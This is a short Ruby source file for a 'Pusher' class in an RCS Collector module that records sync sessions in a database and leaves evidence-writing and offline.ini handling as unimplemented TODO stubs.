#
#  Pusher module for sending evidences to the database
#

# relatives
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'singleton'

module RCS
module Collector

class Pusher
  include Singleton

  def sync_for(session, version, user, device, source, time)

    # notify the database that the sync is in progress
    DB.instance.sync_for session[:bid], version, user, device, source, time

    #TODO: create the LOGREPO/INSTANCE dir

    #TODO: set the SYNC_IN_PROGRESS in the offline.ini
  end

  def sync_end(session)
    #TODO: reset the SYNC_IN_PROGRESS in the offline.ini
  end

  def evidence(size, content)
    #TODO: write the evidence in the enc directory
    raise "not implemented"
  end

end #Pusher

end #Collector::
end #RCS::